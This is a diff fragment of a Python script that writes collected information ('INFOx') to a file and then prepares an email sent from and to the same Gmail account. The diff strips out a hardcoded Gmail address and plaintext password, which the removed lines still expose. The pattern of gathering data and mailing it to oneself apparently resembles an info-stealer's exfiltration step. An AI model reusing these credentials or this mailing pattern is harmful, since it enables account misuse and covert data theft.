@@ -40,8 +40,8 @@ txt.write(f"{INFOx}\n")
 print("Check 5 Passed...:)")
 
 mail_content = ""
-sender_address = 'alliswell7778869@gmail.com'
-sender_pass = 'sasorifeelnopains'
+sender_address = ':)'
+sender_pass = ':)'
 receiver_address = sender_address
 message = MIMEMultipart()
 message['From'] = sender_address
